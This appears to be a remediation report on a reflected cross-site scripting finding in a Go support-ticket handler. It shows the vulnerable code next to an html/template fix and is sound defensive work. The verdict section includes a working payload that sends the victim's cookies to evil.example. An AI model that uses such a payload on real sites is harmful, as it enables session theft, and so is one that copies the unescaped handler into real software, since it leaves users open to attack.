## Verdict

CWE-79 (Cross-Site Scripting) - **exploitable**. Confidence: high.

`fmt.Fprintf(w, "<p>Customer note: %s</p>", customerNote)` at line 16 writes an attacker-controlled query parameter directly into an HTML response with no encoding. A request such as `/support/ticket?note=<script>document.location='https://evil.example/?c='+document.cookie</script>` executes attacker JavaScript in the victim's browser under the site's origin.

## Source

`customerNote := r.URL.Query().Get("note")` (line 10) - an HTTP query parameter, attacker-controlled on every request. It flows unmodified to the sink at line 16: `fmt.Fprintf(w, "<p>Customer note: %s</p>", customerNote)`, which writes raw bytes into a `Content-Type: text/html` response body via `%s` with no HTML encoding.

The adjacent `ticketID := r.URL.Query().Get("id")` (line 9) reaches the same kind of unencoded `fmt.Fprintf` sink at line 14 (`<h2>Ticket %s</h2>`) and carries the identical weakness, even though the SAST finding under remediation points at line 16.

## Fix

Vulnerable code:

```go
package main

import (
	"fmt"
	"net/http"
)

func ticketStatusHandler(w http.ResponseWriter, r *http.Request) {
	ticketID := r.URL.Query().Get("id")
	customerNote := r.URL.Query().Get("note")

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, "<html><body>")
	fmt.Fprintf(w, "<h2>Ticket %s</h2>", ticketID)
	// SAST FINDING: CWE-79 reported here. Sink is the next statement.
	fmt.Fprintf(w, "<p>Customer note: %s</p>", customerNote)
	fmt.Fprintf(w, "</body></html>")
}

func main() {
	http.HandleFunc("/support/ticket", ticketStatusHandler)
	http.ListenAndServe(":8080", nil)
}
```

Fixed code:

```go
package main

import (
	"html/template"
	"net/http"
)

var ticketTemplate = template.Must(template.New("ticket").Parse(
	"<html><body><h2>Ticket {{.TicketID}}</h2><p>Customer note: {{.CustomerNote}}</p></body></html>",
))

type ticketView struct {
	TicketID     string
	CustomerNote string
}

func ticketStatusHandler(w http.ResponseWriter, r *http.Request) {
	ticketID := r.URL.Query().Get("id")
	customerNote := r.URL.Query().Get("note")

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	if err := ticketTemplate.Execute(w, ticketView{TicketID: ticketID, CustomerNote: customerNote}); err != nil {
		http.Error(w, "internal server error", http.StatusInternalServerError)
	}
}

func main() {
	http.HandleFunc("/support/ticket", ticketStatusHandler)
	http.ListenAndServe(":8080", nil)
}
```

## Explanation

The fix replaces the `fmt.Fprintf` string-concatenation output with `html/template`, which performs context-aware HTML escaping automatically. Both untrusted values (`ticketID`, `customerNote`) are passed as template data through `{{.TicketID}}` / `{{.CustomerNote}}` placeholders rather than interpolated into the markup string, so `<`, `>`, `&`, `"`, and `'` are escaped before being written to the response and can no longer break out of the `<h2>`/`<p>` text context into executable markup. The three separate `fmt.Fprintf` calls that built one HTML document are consolidated into a single parsed template and one `Execute` call, per the Go guidance's rule against mixing `fmt.Fprintf` writes with `template.Execute` for the same output - splitting the response between the two would leave the non-templated fragments unescaped and defeat the fix.

## Behaviour changes

- `ticketID` (previously unescaped at line 14) is now also HTML-escaped. This is a second live instance of the same CWE-79 weakness on the same handler, not part of the reported finding at line 16, but leaving it as a raw `fmt.Fprintf` write while wrapping only `customerNote` in a template would violate the "don't mix Fprintf and template.Execute for the same output" rule and would leave `ticketID` exploitable. Fixing it here is a scope extension the reviewer should confirm; if `ticketID` must stay untouched, it can be excluded from the template and left as-is, but that reintroduces the original mixing problem for the `note` field. Legitimate values containing `<`, `&`, or `"` in either field will now render as escaped entities rather than being passed through raw - this is the intended effect of closing the XSS, not a regression, but any client-side code expecting raw HTML in this response would need updating.
- Error handling added: `template.Execute` can fail (e.g. a template internal error) and returns an `error`, unlike the original `fmt.Fprintf` calls whose errors were silently discarded. The fix now writes an HTTP 500 on that failure. If `Execute` fails after it has already written part of the body, the response may end up truncated with a superfluous `WriteHeader` call logged by `net/http`; this matches idiomatic `html/template` usage and is preferable to silently discarding the error as the original code did, but is a behavior the original code did not exhibit (it never checked errors at all).
- No change to the response's `Content-Type` header, route, or the overall HTML structure (`<html><body><h2>...</h2><p>...</p></body></html>`) - only the escaping of the two dynamic values and the consolidation of the writes.
